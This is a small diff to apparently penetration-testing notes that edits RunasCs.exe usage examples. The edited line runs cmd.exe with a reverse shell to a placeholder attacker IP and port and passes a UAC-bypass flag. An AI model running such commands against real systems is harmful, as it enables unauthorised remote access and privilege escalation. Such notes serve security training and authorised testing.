@@ -24,10 +24,10 @@ Since the password cannot be supplied as an argument, the session must be intera
 
 ```powershell
 #RunAs locally 
-RunasCs.exe $USERNAME $PASSWORD $CMD -d $DOMAIN
+RunasCs.exe $USERNAME $PASSWORD $Command -d $DOMAIN
 
 #RunAs and spawn a revers shell and bypass UAC
-RunasCs.exe $USERNAME $PASSWORD $CMD -d $DOMAIN -r $ATTACKING_IP:$PORT --bypass-uac
+RunasCs.exe $USERNAME $PASSWORD cmd.exe -d $DOMAIN -r $ATTACKING_IP:$PORT --bypass-uac
 ```
 
 Or, we may use the powershell version
